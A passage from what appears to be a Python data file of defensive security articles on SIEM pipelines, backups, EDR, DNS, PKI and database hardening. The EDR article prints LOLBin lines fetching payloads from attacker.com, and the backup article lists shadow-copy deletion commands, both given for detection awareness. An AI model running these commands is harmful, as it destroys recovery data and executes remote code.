    "ip": "203.0.113.5",
    "port": 45231
  },
  "host": {
    "name": "dc01.corp.com"
  }
}
```

## Logstash Pipeline Example

```ruby
# /etc/logstash/conf.d/windows_events.conf
input {
  beats {
    port => 5044
    ssl  => true
    ssl_certificate => "/etc/logstash/certs/logstash.crt"
    ssl_key         => "/etc/logstash/certs/logstash.key"
  }
}

filter {
  if [event][code] == "4625" {
    mutate {
      add_tag => ["failed_logon"]
      add_field => {"[event][action]" => "authentication_failure"}
    }
    # Extract structured fields from the Message
    grok {
      match => {"message" => "Account Name:\\s+%{WORD:[user][name]}"}
    }
  }

  if [event][code] == "4688" {
    mutate { add_tag => ["process_creation"] }
    grok {
      match => {"message" => "New Process Name:\\s+%{GREEDYDATA:[process][executable]}"}
    }
  }

  # Enrich with GeoIP
  if [source][ip] {
    geoip {
      source => "[source][ip]"
      target => "[source][geo]"
    }
  }

  # Tag as IOC if IP is in threat intel list
  translate {
    source => "[source][ip]"
    target => "[threat][indicator]"
    dictionary_path => "/etc/logstash/threat_intel.yaml"
    add_tag => ["threat_intel_hit"]
    fallback => "not_in_ti"
  }
}

output {
  elasticsearch {
    hosts => ["https://es01:9200"]
    ssl   => true
    cacert => "/etc/logstash/certs/ca.crt"
    index => "logs-windows-%{+YYYY.MM.dd}"
    user  => "logstash_internal"
    password => "${LOGSTASH_ES_PASSWORD}"
  }
}
```

## Retention Architecture

```
Hot tier (SSD):       7-14 days   — active searching, real-time correlation
Warm tier (HDD):      30-90 days  — investigation support
Cold tier (object):   1-7 years   — compliance and long-term investigation
Frozen (tape/glacier): 7+ years   — regulatory requirement

Sizing rule of thumb (Elasticsearch):
  Log volume (GB/day) x retention (days) x 1.5 (overhead) = raw storage needed
  Example: 50 GB/day x 90 days x 1.5 = 6.75 TB for warm tier
```

```bash
# Elasticsearch ILM policy: move through hot -> warm -> cold -> delete
curl -X PUT "https://es01:9200/_ilm/policy/logs_policy" \\
    -H "Content-Type: application/json" \\
    -u elastic:PASSWORD \\
    -d '{
      "policy": {
        "phases": {
          "hot":  {"min_age": "0ms", "actions": {"rollover": {"max_size":"50gb"}}},
          "warm": {"min_age": "14d",  "actions": {"shrink":{"number_of_shards":1}}},
          "cold": {"min_age": "90d",  "actions": {"freeze": {}}},
          "delete": {"min_age": "365d","actions": {"delete": {}}}
        }
      }
    }'
```

## Log Integrity

Logs are only useful if you can trust they haven't been tampered with:

```bash
# Ship logs off-system immediately to a SIEM or log aggregator
# Compromise of the source host should not affect already-shipped logs

# Linux: rsyslog forwarding to SIEM via TLS
# /etc/rsyslog.conf
# *.* @@(o)siem.corp.com:6514   # TCP with TLS ('o' = enhanced framing)

# Windows: configure Windows Event Forwarding to a Windows Event Collector
# Then forward WEC -> SIEM

# Log signing (auditd)
augenrules --load
# Configure FSS (Forward-Secure Sealing) in journald:
# /etc/systemd/journald.conf
# [Journal]
# Seal=yes   # Each log entry is HMAC-chained

# Immutable S3 bucket for CloudTrail logs
aws s3api put-object-lock-configuration --bucket my-cloudtrail-bucket \\
    --object-lock-configuration '{
        "ObjectLockEnabled":"Enabled",
        "Rule":{"DefaultRetention":{"Mode":"GOVERNANCE","Days":365}}
    }'
```

## SIEM Detection Engineering Checklist

```
Coverage assessment:
[ ] Map log sources to MITRE ATT&CK techniques they cover
[ ] Identify gaps (techniques with no log source)
[ ] Track log source health (is this source still sending?)

Rule quality:
[ ] Every rule has a tested true-positive case
[ ] False positive rate measured and acceptable (<5% for high-severity)
[ ] Rules tied to MITRE ATT&CK TIDs for coverage reporting

Operational:
[ ] Log volume monitored — sudden drops indicate collection failure
[ ] Parsing errors monitored — high error rate = missed fields
[ ] Index disk usage tracked — avoid full disk dropping logs
[ ] On-call rotation owns alert queue
[ ] SLAs: P1 alerts acknowledged in 15 min, P2 in 1 hour
```
""",
    },
    {
        "title": "Backup and Recovery Architecture — 3-2-1 Rule and Ransomware-Resistant Storage",
        "tags": ["backup", "recovery", "ransomware", "bcdr", "architecture", "immutable-backups"],
        "content": """# Backup and Recovery Architecture — 3-2-1 Rule and Ransomware-Resistant Storage

## The 3-2-1 Backup Rule

The foundational backup principle:
- **3** copies of data
- **2** different storage media types
- **1** copy offsite (geographically separate)

```
Production Data
  |
  +---> Local backup (NAS, same site)     [copy 2, media type 1]
  |
  +---> Cloud backup (AWS S3, Azure Blob) [copy 3, offsite, media type 2]

Original production = copy 1
```

Modern extension: **3-2-1-1-0**
- 3 copies
- 2 media types
- 1 offsite
- **1 offline / air-gapped** (cannot be reached by ransomware)
- **0 errors** (verified restore tests)

## Ransomware and Backup Targeting

Modern ransomware explicitly targets backup systems before encrypting production data:

**Attack sequence:**
1. Initial access → privilege escalation → domain admin
2. Discovery: identify backup servers, cloud backup credentials, tape libraries
3. Delete or encrypt backup catalogues and repositories
4. Delete VSS shadow copies (Windows) to prevent quick recovery
5. Deploy ransomware to encrypt production data

**Common backup attack methods:**
```powershell
# VSS deletion (seen in virtually all ransomware families)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No

# Backup agent credential theft
# Veeam, Commvault, Veritas credentials in Windows Credential Manager
# or hard-coded in config files -- attackers extract and use to delete cloud backups
```

## Ransomware-Resistant Backup Architecture

### Immutable Object Storage

Cloud object stores with Object Lock / WORM (Write Once Read Many):

```bash
# AWS S3 Object Lock — prevent deletion or overwrite for N days
aws s3api put-object-lock-configuration \\
    --bucket my-backup-bucket \\
    --object-lock-configuration '{
        "ObjectLockEnabled": "Enabled",
        "Rule": {
            "DefaultRetention": {
                "Mode": "COMPLIANCE",  # GOVERNANCE = admin can override; COMPLIANCE = no-one can
                "Days": 30
            }
        }
    }'

# Azure: immutable blob storage
az storage container immutability-policy create \\
    --resource-group myRG \\
    --account-name myStorageAccount \\
    --container-name backups \\
    --period 30      # 30 days immutability
```

**COMPLIANCE mode** vs **GOVERNANCE mode:**
- Compliance: even the root account cannot delete during the retention period
- Governance: privileged users can override (weaker protection)

For ransomware protection, use **COMPLIANCE** mode.

### Air-Gapped Backups

An air-gapped backup has no network connection to the production environment:

```
Production Network                 Air-Gap Boundary
+------------------+               |
| Backup Server    |               |
|   sends backup   |----[write]----+-->  Offline Tape / Removable Drive
| THEN connection  |               |    (physically disconnected afterward)
| is severed       |               |
+------------------+               |
```

Cloud air-gap: use a separate cloud account with no production IAM access, automated via a dedicated pipeline that runs, rotates credentials immediately after, and has no persistent access.

### Backup Network Isolation

```
Production VMs        (10.0.0.0/24)
       |
[Firewall — allow backup port only from backup server IP]
       |
Backup Server         (10.0.99.10)
       |
[Firewall — no production access from backup network]
       |
Backup Repository     (10.0.99.0/24)
```

The backup server has read access to production for data collection. The backup repository network should have NO direct access to production. Ransomware on the production network cannot reach the repository.

## Recovery Testing

A backup that has never been tested is not a backup — it's an untested assumption.

```bash
# Recovery test checklist (quarterly minimum)
[ ] Select a random set of critical files from last backup
[ ] Restore to an isolated test environment
[ ] Verify file integrity: compare SHA256 of restored vs original
[ ] Test application functionality after restore
[ ] Document actual Recovery Time (how long did restore take?)
[ ] Compare vs RTO (Recovery Time Objective) — did we meet it?
[ ] Check Recovery Point (how old was the restored data?)
[ ] Compare vs RPO (Recovery Point Objective)

# Automated integrity check script
#!/bin/bash
BACKUP_DIR="/backups/latest"
MANIFEST="/backups/sha256_manifest.txt"

# Verify every file in the backup matches the stored hash
while IFS='  ' read -r expected_hash filepath; do
    actual_hash=$(sha256sum "$BACKUP_DIR/$filepath" 2>/dev/null | cut -d' ' -f1)
    if [ "$actual_hash" != "$expected_hash" ]; then
        echo "CORRUPT: $filepath (expected $expected_hash, got $actual_hash)"
    fi
done < "$MANIFEST"
echo "Integrity check complete"
```

## RTO and RPO

**RPO (Recovery Point Objective)** — Maximum acceptable data loss, measured in time. If RPO = 4h, backups must run at least every 4 hours.

**RTO (Recovery Time Objective)** — Maximum acceptable downtime. If RTO = 2h, the restore process must complete within 2 hours.

```
Timeline example:
09:00 — Last successful backup
13:00 — Ransomware detected
13:30 — Decision to restore from backup

  Backup at 09:00 — RPO breach = 4 hours of data loss (09:00-13:00)
  Restore started 13:30 — completed 15:30
  Systems online 15:30 — RTO = 2 hours from restore start

Does this meet your business requirements?
If RPO = 1h but backup was 4h ago -> RPO violation
If RTO = 1h but restore took 2h -> RTO violation
```

## Backup Security Hardening

```bash
# Veeam: use a dedicated backup account with minimum privileges
# -- only required permissions, no domain admin
# Rotate backup service account password regularly

# Linux backup agent: run as non-root where possible
# Store backup repository credentials in a password manager, not on backup server

# Monitor for backup deletion events
# AWS CloudTrail: s3:DeleteObject on backup bucket -> immediate alert
# Azure: monitor for blob deletion on backup container
# Windows: Event ID 524 (Windows Backup) + shadow copy deletion

# Alert on: backup job failures for >24h (could indicate ransomware deleted backups)
```
""",
    },
    {
        "title": "Endpoint Protection Architecture — AV, EDR, and XDR Stack Design",
        "tags": ["endpoint-security", "edr", "xdr", "antivirus", "architecture", "detection"],
        "content": """# Endpoint Protection Architecture — AV, EDR, and XDR Stack Design

## Evolution of Endpoint Protection

```
Generation 1 (1990s-2000s): Signature AV
  - Hash and signature matching against known-bad files
  - Zero-day blind: unknown malware bypasses entirely
  - Still valuable as a commodity control

Generation 2 (2010s): Next-Gen AV (NGAV)
  - ML/AI for behavioural classification without signatures
  - Memory scanning, script emulation
  - Reduces (but doesn't eliminate) signature dependency

Generation 3 (2015+): EDR (Endpoint Detection and Response)
  - Continuous telemetry: process creation, file write, registry, network
  - Historical forensics: "what happened before this alert?"
  - Isolation capability: quarantine host from network
  - Response actions: kill process, delete file, pull forensic artifact

Generation 4 (2020+): XDR (Extended Detection and Response)
  - Correlates EDR + email + network + cloud + identity telemetry
  - Unified attack story across multiple control planes
  - Examples: Microsoft Defender XDR, CrowdStrike Falcon Platform, Palo Alto Cortex XDR
```

## EDR Architecture

```
Endpoint Agent
  |
  +-- Kernel driver: intercept syscalls at OS level
  |     Sees: process create/terminate, file create/modify/delete,
  |           network connect, registry changes, DLL loads, memory ops
  |
  +-- User-mode agent: correlate and buffer events
  |
  +-- Secure channel (TLS) --> EDR Cloud Console / On-Prem Server
                                   |
                                   +-- Telemetry storage (1-90 days)
                                   +-- Detection rules (IOCs + behavioural)
                                   +-- Response console
                                   +-- Threat hunting interface
```

## Key EDR Capabilities for SOC Analysts

### Process Telemetry

```
Every process creation event includes:
- Parent PID and name
- Command line (with arguments)
- User and integrity level
- File hash (MD5/SHA1/SHA256)
- Signed/unsigned status
- Timestamp
- Network connections made by the process
```

```powershell
# Microsoft Defender for Endpoint: Advanced Hunting (KQL)
DeviceProcessEvents
| where Timestamp > ago(1h)
| where ProcessCommandLine has_any ("IEX", "DownloadString", "-enc", "WebClient")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
| take 50
```

### File and Registry Telemetry

```kql
// MDE: Find files created in suspicious locations in last 24h
DeviceFileEvents
| where Timestamp > ago(24h)
| where FolderPath has_any (@"C:\\Temp\\", @"C:\\Users\\Public\\", @"\\AppData\\Local\\Temp\\")
| where ActionType == "FileCreated"
| where FileName endswith ".exe" or FileName endswith ".dll" or FileName endswith ".ps1"
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName
| order by Timestamp desc
```

### Network Telemetry

```kql
// MDE: Processes making outbound connections on unusual ports
DeviceNetworkEvents
| where Timestamp > ago(1h)
| where ActionType == "ConnectionSuccess"
| where RemotePort !in (80, 443, 53, 8080, 8443)
| where InitiatingProcessFileName !in ("svchost.exe", "lsass.exe", "services.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort
| summarize count() by InitiatingProcessFileName, RemotePort
| order by count_ desc
```

## EDR Bypass Techniques (Detection Awareness)

**Living off the Land (LOLBins)** — Using legitimate OS binaries to avoid EDR triggers:

```bash
# Legitimate tools abused by attackers
certutil.exe -decode encoded.b64 payload.exe    # File decode
mshta.exe http://attacker.com/payload.hta       # Remote HTA execution
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll  # Squiblydoo
wmic.exe process call create "cmd.exe /c whoami"  # Process creation via WMI
bitsadmin /transfer job http://attacker.com/evil.exe C:\\temp\\evil.exe  # Download
```

**Detection**: Modern EDRs have specific detections for LOLBin abuse. SOC rules should alert on LOLBin command lines matching attack patterns:

```kql
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "mshta.exe", "regsvr32.exe", "bitsadmin.exe")
| where ProcessCommandLine has_any ("http://", "https://", "-decode", "/i:", "scrobj")
| project Timestamp, DeviceName, ProcessCommandLine
```

## AV + EDR + XDR Stack Design

```
Endpoint Stack (per device):
+------------------------------------+
| EDR Agent (primary telemetry)      |  --> Cloud console
|   Kernel driver + user mode agent  |
+------------------------------------+
| NGAV (built-in to most EDRs)       |  --> Signature + ML detection
+------------------------------------+
| Host-based Firewall                |  --> Policy-controlled per VLAN/user
+------------------------------------+
| Vulnerability Scanner (agent)      |  --> Patch management integration
+------------------------------------+

XDR Layer (cross-source correlation):
EDR telemetry
    +
Email gateway alerts          --> XDR Platform
    +
Network sensor (NDR)              |
    +                             v
Cloud API audit logs          Correlated attack story
    +                         Automated response (isolate, block)
Identity logs                 Single investigation pane
```

## Incident Response with EDR

```
When an alert fires:
1. Open alert in EDR console
2. Review process tree (parent-child chain, who launched what)
3. Expand timeline: what happened 60 minutes before the alert?
   - How did the process get on disk?
   - What files did it create/modify?
   - What network connections did it make?
4. Check prevalence: has this hash/behaviour been seen on other devices?
5. Isolate if confirmed compromise (one click in most EDRs)
6. Collect forensic artifact (memory dump, suspicious files) remotely
7. Push IOC block (hash, IP, domain) to prevent lateral spread
```

```bash
# CrowdStrike Real-Time Response (RTR): remote command execution on isolated host
# Via Falcon console:
# > ls C:\\Users\\jsmith\\Downloads
# > get C:\\Users\\jsmith\\Downloads\\suspicious.exe   (pull file for analysis)
# > kill 4521                                        (kill process)
# > reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

# Microsoft Defender for Endpoint: Live Response
# Via MDE portal:
# > run GetAvailableFiles.ps1
# > getfile C:\\temp\\malware.dll
# > remediate -Type File -Id <file_path>
```

## EDR Coverage Gaps

No EDR has 100% coverage. Common gaps:

| Gap | Notes |
|-----|-------|
| Firmware/UEFI | Below OS level — EDR cannot see |
| Network-only malware | Fileless attacks that never touch disk |
| Encrypted tunnels | EDR sees the process but not the payload |
| VM-based malware | Guest OS exploits may evade host EDR |
| Mobile devices | Most EDRs don't cover iOS/Android |
| OT/ICS devices | Embedded OS, no agent support |

Compensating controls for gaps: NDR (Network Detection and Response) for encrypted traffic, UEFI secure boot for firmware, separate mobile MDM solutions.
""",
    },
    {
        "title": "DNS Security Architecture — Split-Horizon, DNSSEC, and Sinkholing",
        "tags": ["dns", "dnssec", "sinkhole", "split-horizon", "architecture", "security"],
        "content": """# DNS Security Architecture — Split-Horizon, DNSSEC, and Sinkholing

## DNS as a Security Boundary

DNS is involved in almost every attack: C2 beaconing, data exfiltration via DNS tunnelling, domain generation algorithms (DGA), and initial phishing lure delivery. Securing DNS — and monitoring it — is foundational.

## Split-Horizon DNS (Split-Brain DNS)

Split-horizon DNS serves different answers to internal vs external queries for the same domain. Internal users see private IPs; external users see public IPs.

```
Query: mail.corp.com

Internal DNS (10.0.0.1):
  mail.corp.com --> 10.0.10.50 (internal mail server IP)

External DNS (public resolvers, 8.8.8.8):
  mail.corp.com --> 203.0.113.25 (public-facing IP via NAT/loadbalancer)
```

**Security benefits:**
- Internal service details (private IP ranges, internal hostnames) are not visible externally
- Internal DNS can enforce additional controls (RPZ blocking, logging)
- DNS-based access control: internal users only resolve internal services

**Implementation (BIND9):**
```
# /etc/named.conf
view "internal" {
    match-clients { 10.0.0.0/8; 192.168.0.0/16; };
    zone "corp.com" {
        type master;
        file "/etc/bind/internal/corp.com.zone";  // Internal zone with private IPs
    };
};

view "external" {
    match-clients { any; };
    zone "corp.com" {
        type master;
        file "/etc/bind/external/corp.com.zone";  // Public zone with public IPs
    };
};
```

## DNSSEC — DNS Security Extensions

DNSSEC adds cryptographic signatures to DNS responses, allowing resolvers to verify that the response is authentic and unmodified.

```
Without DNSSEC:
Client asks: What is the IP for bank.com?
Attacker intercepts and replies: 203.0.113.99 (attacker IP)
Client connects to attacker -- DNS cache poisoning / BGP hijack

With DNSSEC:
Client asks: What is the IP for bank.com?
DNS response includes cryptographic signature
Client verifies signature using bank.com's DNSKEY
If signature invalid: SERVFAIL -- client does not connect
```

**DNSSEC chain of trust:**

```
Root Zone (.) -- signed by ICANN
    |
.com TLD zone -- signed by VeriSign
    |
bank.com zone -- signed by bank.com's nameserver
    |
www.bank.com A record -- signed
```

```bash
# Check if a domain has DNSSEC enabled
dig +dnssec A bank.com
# Look for: RRSIG records (signatures), AD flag in response (authenticated)

# Check DNSKEY record
dig DNSKEY corp.com

# Validate DNSSEC chain
delv @8.8.8.8 corp.com A +rtrace

# Check DS (Delegation Signer) record at parent zone
dig DS corp.com @a.gtld-servers.net
```

**DNSSEC limitations:**
- Protects against forged responses (on-path attacks) but NOT against:
  - A legitimate resolver returning the wrong answer
  - Compromised authoritative nameserver
  - DNS over unencrypted UDP (still sniffable, just not modifiable undetected)
- Does not encrypt DNS — use DoH/DoT for privacy

## DNS over HTTPS (DoH) and DNS over TLS (DoT)

Encrypts DNS queries to prevent eavesdropping and manipulation in transit:

```bash
# Test DoH (RFC 8484)
curl -s -H 'accept: application/dns-json' \\
    'https://cloudflare-dns.com/dns-query?name=example.com&type=A' | jq '.Answer[].data'

# Configure systemd-resolved to use DoT
# /etc/systemd/resolved.conf:
# [Resolve]
# DNS=9.9.9.9#dns.quad9.net 149.112.112.112#dns.quad9.net
# DNSOverTLS=yes

# Verify
resolvectl query example.com
resolvectl status | grep "DNS over TLS"
```

## DNS Sinkholing

A sinkhole redirects DNS queries for malicious domains to a controlled IP address (typically returning a non-existent page or a warning):

```
Normal malware C2 flow:
Infected Host --> DNS: c2domain.com? --> Real IP: 203.0.113.100 --> C2 Server

Sinkholed:
Infected Host --> DNS: c2domain.com? --> Sinkhole IP: 10.0.99.5  --> No response / warning
                                          ^
                                   Security team controls this
                                   AND gets notified of infection
```

**Benefits:**
- Identifies infected hosts (which endpoints queried the sinkholed domain?)
- Breaks C2 communication
- Provides time to remediate without alerting attacker

**Implementation with BIND9 RPZ (Response Policy Zone):**
```
# /etc/named.conf: enable RPZ
zone "rpz.corp.com" {
    type master;
    file "/etc/bind/rpz.corp.com.zone";
};

options {
    response-policy { zone "rpz.corp.com"; };
};

# /etc/bind/rpz.corp.com.zone: sinkhole entries
c2domain.com.rpz.corp.com.  IN  A   10.0.99.5   ; Sinkhole IP
evilmalware.net.rpz.corp.com. IN  A  10.0.99.5
```

## DNS Monitoring for Threat Hunting

DNS logs are gold for threat hunters. Every C2 beacon, DGA domain, and tunnelling attempt leaves a DNS trace:

```bash
# Enable DNS query logging in BIND
# /etc/named.conf:
# logging {
#     channel query_log {
#         file "/var/log/named/query.log" versions 5 size 50m;
#         print-time yes;
#     };
#     category queries { query_log; };
# };

# Hunt for DGA domains (high entropy, lots of random-looking subdomains)
# In Elasticsearch / SIEM:
# dns.question.name with Shannon entropy > 3.5 AND
# dns.question.name NOT in known-good baseline

# Hunt for DNS tunnelling (unusually long queries)
grep -E "IN A [A-Za-z0-9-]{50,}\\." /var/log/named/query.log | \\
    awk '{print $7}' | sort | uniq -c | sort -rn | head -20

# Find hosts querying known-bad domains (threat intel enrichment)
# Cross-reference DNS logs with threat intel feed of malicious domains

# DNS beaconing: same domain queried regularly at consistent intervals
# Look for (host, domain) pairs with >20 queries/hour and consistent timing
```

## DNS Security Checklist

```
Infrastructure:
[ ] Split-horizon DNS separates internal/external views
[ ] DNSSEC enabled for public-facing zones
[ ] DNS resolvers do not allow recursive queries from internet (open resolver)
[ ] DNS servers patched against BIND/Windows DNS CVEs
[ ] DNS zone transfers restricted to authorised secondary servers

Detection:
[ ] DNS query logs centralised in SIEM
[ ] Alerts on: unusually long queries (>50 chars subdomain)
[ ] Alerts on: high query rate to a single domain (beaconing)
[ ] Alerts on: newly registered domains (<30 days old)
[ ] RPZ/sinkhole for known-bad domains from threat intel feeds
[ ] DoH/DoT enforcement to prevent client-side DNS bypass

Access control:
[ ] Internal DNS filtered by category (malware, phishing, C2) via DNS RPZ or Umbrella/Secure DNS
[ ] Prevent DNS queries to external resolvers bypassing internal DNS
    (firewall block outbound UDP/TCP 53 except from DNS server IPs)
```
""",
    },
    {
        "title": "PKI and Certificate Management — CA Hierarchy and Certificate Lifecycle",
        "tags": ["pki", "certificates", "tls", "ca", "certificate-management", "architecture"],
        "content": """# PKI and Certificate Management — CA Hierarchy and Certificate Lifecycle

## PKI Fundamentals

Public Key Infrastructure (PKI) is the system of policies, procedures, and technology that manages digital certificates. Certificates bind a public key to an identity, enabling TLS, code signing, email signing (S/MIME), and client authentication.

## CA Hierarchy

A root CA is the ultimate trust anchor. Because compromising the root compromises everything it signed, best practice uses an **offline root CA** with intermediate CAs that do the day-to-day signing.

```
Root CA (offline, air-gapped)
    |
    |-- signs -->
    |
Intermediate CA 1 (TLS certificates for external sites)
    |-- signs --> leaf certificates (www.corp.com, api.corp.com)

Intermediate CA 2 (Internal services)
    |-- signs --> leaf certificates (internal servers, VPN)

Intermediate CA 3 (Code signing)
    |-- signs --> code signing certificates

Intermediate CA 4 (Client/device certificates)
    |-- signs --> user and machine certificates
```

**Why offline root?** If the root CA private key is compromised, the entire CA hierarchy is compromised — every certificate it ever signed becomes untrusted. Keeping it offline (and in an HSM or secure vault) eliminates network attack surface.

## Certificate Anatomy

```
$ openssl x509 -in cert.pem -text -noout

Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 12345678
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = Corp Intermediate CA 1
        Validity:
            Not Before: Mar  1 00:00:00 2026 GMT
            Not After : Mar  1 00:00:00 2027 GMT
        Subject: CN = www.corp.com, O = Corp Ltd, C = GB
        Subject Public Key Info: RSA Public Key (2048 bit)
        X509v3 extensions:
            Subject Alternative Name:
                DNS:www.corp.com, DNS:corp.com
            Key Usage: Digital Signature, Key Encipherment
            Extended Key Usage: TLS Web Server Authentication
            CRL Distribution Points:
                URI:http://crl.corp.com/ca1.crl
            Authority Information Access:
                OCSP - URI:http://ocsp.corp.com
                CA Issuers - URI:http://aia.corp.com/ca1.crt
```

## Certificate Lifecycle

```
1. Key generation (on requestor or HSM)
2. CSR (Certificate Signing Request) created
3. Submitted to CA
4. CA validates identity (DV / OV / EV)
5. CA signs and issues certificate
6. Certificate deployed to server/service
7. Certificate monitored for expiry
8. Certificate renewed or replaced before expiry
9. If compromised: REVOKED via CRL or OCSP
```

## TLS Certificate Types

| Type | Validation | Use Case |
|------|------------|---------|
| DV (Domain Validated) | DNS control only | Basic HTTPS, no org identity |
| OV (Organisation Validated) | Identity + DNS | Business websites |
| EV (Extended Validation) | Full legal identity check | High-value sites (banking) |
| Wildcard `*.corp.com` | DNS control | All subdomains under one cert |
| SAN (Multi-domain) | DNS control per name | Multiple domains on one cert |
| Client cert | Device/user identity | mTLS, VPN auth, 802.1X |

## Revocation: CRL and OCSP

When a certificate is compromised, it must be revoked before its expiry date.

**CRL (Certificate Revocation List)** — Periodically published list of revoked serial numbers. Client downloads the list (can be large and stale).

**OCSP (Online Certificate Status Protocol)** — Real-time query to a responder: "Is serial 12345 still valid?" Returns: good, revoked, or unknown.

**OCSP Stapling** — Server includes a pre-fetched OCSP response in the TLS handshake, eliminating the client's need to contact the OCSP responder (better privacy and performance).

```bash
# Check certificate revocation status
openssl ocsp -issuer intermediate-ca.pem -cert server.pem \\
    -url http://ocsp.corp.com -resp_text

# Download and check CRL
curl -o crl.pem http://crl.corp.com/ca1.crl
openssl crl -in crl.pem -text -noout | grep "Serial Number"

# Full certificate chain verification
openssl verify -CAfile /etc/ssl/certs/ca-bundle.crt \\
    -untrusted intermediate-ca.pem server.pem
```

## Certificate Monitoring and Expiry Management

Certificate expiry is a common cause of outages. Automated monitoring is essential.

```bash
# Check a certificate's expiry date
openssl s_client -connect www.corp.com:443 -servername www.corp.com 2>/dev/null |
    openssl x509 -noout -dates

# Script: check expiry across multiple endpoints
#!/bin/bash
HOSTS="www.corp.com api.corp.com mail.corp.com"
WARNING_DAYS=30

for host in $HOSTS; do
    expiry=$(echo | openssl s_client -connect "$host:443" -servername "$host" 2>/dev/null |
             openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2)
    if [ -z "$expiry" ]; then
        echo "CANNOT CONNECT: $host"
        continue
    fi
    expiry_epoch=$(date -d "$expiry" +%s)
    now_epoch=$(date +%s)
    days_left=$(( (expiry_epoch - now_epoch) / 86400 ))

    if [ $days_left -lt 0 ]; then
        echo "EXPIRED: $host ($expiry)"
    elif [ $days_left -lt $WARNING_DAYS ]; then
        echo "EXPIRING SOON: $host — $days_left days ($expiry)"
    else
        echo "OK: $host — $days_left days ($expiry)"
    fi
done

# Certificate Transparency log monitoring
# certstream — real-time stream of new certificates
# Monitors for: new certs for your domain, typosquatting domains, wildcard cert theft
pip install certstream
python3 -c "
import certstream
def callback(message, context):
    if message['message_type'] == 'certificate_update':
        domains = message['data']['leaf_cert']['all_domains']
        for d in domains:
            if 'corp.com' in d:
                print('New cert:', d)
certstream.listen_for_events(callback)
"
```

## Internal PKI with Let's Encrypt ACME Protocol

For internal CAs, the ACME protocol (used by Let's Encrypt) can automate certificate issuance and renewal:

```bash
# Step CA (open source internal CA with ACME)
# Install Step CA on a server
step ca init --name "Corp Internal CA" --dns ca.corp.com --address :443

# Issue certificate via ACME
certbot certonly --server https://ca.corp.com/acme/acme/directory \\
    -d internal-service.corp.com \\
    --standalone

# Auto-renew with systemd timer
systemctl enable certbot.timer
systemctl start certbot.timer

# Let's Encrypt (public): certificates for internet-facing services
certbot certonly --standalone -d www.corp.com
# Auto-renewal built-in; certificates are 90-day to encourage automation
```

## PKI Security Checklist

```
Infrastructure:
[ ] Root CA is offline and HSM-protected
[ ] Separate intermediate CAs for different use cases
[ ] CRL and OCSP responders are highly available
[ ] Certificate templates restrict key usage and EKU

Operations:
[ ] Certificate inventory maintained (who owns what, expiry dates)
[ ] Automated monitoring alerts at 60 days, 30 days, 7 days before expiry
[ ] Certificate issuance requires approval workflow for sensitive uses
[ ] Private keys never leave HSMs for root/intermediate CAs
[ ] Key ceremonies documented and witnessed

Detection:
[ ] Certificate Transparency monitoring for unauthorised certificates for your domains
[ ] Alert on: self-signed certificates in use on internal services
[ ] Alert on: certificates issued by unauthorised CAs in the trust store
[ ] Monitor: Windows Event Log 4886/4887 (certificate requests/issued)
```
""",
    },
]

DATA_SECURITY = [
    {
        "title": "Database Security Fundamentals — SQL Server, PostgreSQL, MySQL Hardening",
        "tags": ["database", "sql-server", "postgresql", "mysql", "hardening", "data-security"],
        "content": """# Database Security Fundamentals — SQL Server, PostgreSQL, MySQL Hardening

## Why Database Security is Critical

Databases store the crown jewels: customer PII, financial records, credentials, intellectual property. A compromised database is typically the final objective in an attack chain. Database security involves hardening the engine, controlling access, monitoring activity, and encrypting data.

## Common Database Attack Vectors

| Attack | Description | Prevention |
|--------|-------------|------------|
| SQL Injection | Malicious SQL in application input | Parameterised queries, WAF, input validation |
| Credential stuffing | Breached creds used on DB | Strong unique passwords, MFA for DB access |
| Privilege escalation | Abusing DB features (xp_cmdshell) | Principle of least privilege, disable dangerous features |
| Lateral movement | Using DB to pivot (linked servers) | Restrict linked servers, network segmentation |
| Data exfiltration | Bulk SELECT dumps | DLP, network egress monitoring, activity monitoring |
| Backup theft | Unencrypted DB backups on NAS | Encrypt backups, restrict backup access |

## SQL Server Hardening

```sql
-- Disable xp_cmdshell (allows OS command execution via SQL)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Disable unnecessary features
EXEC sp_configure 'Ole Automation Procedures', 0;
EXEC sp_configure 'Ad Hoc Distributed Queries', 0;
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;

-- Check SQL Server login configuration
-- Use Windows Authentication (Kerberos) not SQL auth where possible
SELECT name, type_desc, is_disabled
FROM sys.server_principals
WHERE type IN ('S', 'U')   -- SQL logins + Windows logins
ORDER BY type_desc;

-- Revoke CONNECT permission from PUBLIC on master
USE master;
REVOKE CONNECT FROM PUBLIC;
```

```powershell
# PowerShell: check SQL Server configuration
Invoke-Sqlcmd -Query "EXEC sp_configure;" -ServerInstance "." |
    Where-Object {$_.config_value -ne $_.run_value} |
    Select-Object name, config_value, run_value

# Check for SQL Server SA account (should be disabled or renamed)
Invoke-Sqlcmd -Query "SELECT name, is_disabled FROM sys.sql_logins WHERE name='sa'"
```

## PostgreSQL Hardening

```bash
# postgresql.conf: restrict listening and connections
listen_addresses = 'localhost'     # or specific IP, not '*'
port = 5432
ssl = on                           # Always use TLS

# pg_hba.conf: enforce authentication
# TYPE  DATABASE   USER       ADDRESS          METHOD
  host  all        all        0.0.0.0/0        reject   # Block all remote by default
  host  mydb       myapp      10.0.2.0/24      scram-sha-256  # Allow only app subnet
  local all        postgres                    peer     # Local postgres user via peer auth
```

```sql
-- PostgreSQL: principle of least privilege
-- Create application user with minimum rights
CREATE USER appuser WITH PASSWORD 'SecurePass2026!' LOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE;
GRANT CONNECT ON DATABASE myapp TO appuser;
GRANT USAGE ON SCHEMA public TO appuser;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO appuser;
-- Do NOT grant: SUPERUSER, CREATEDB, CREATEROLE, ALTER TABLE, DROP

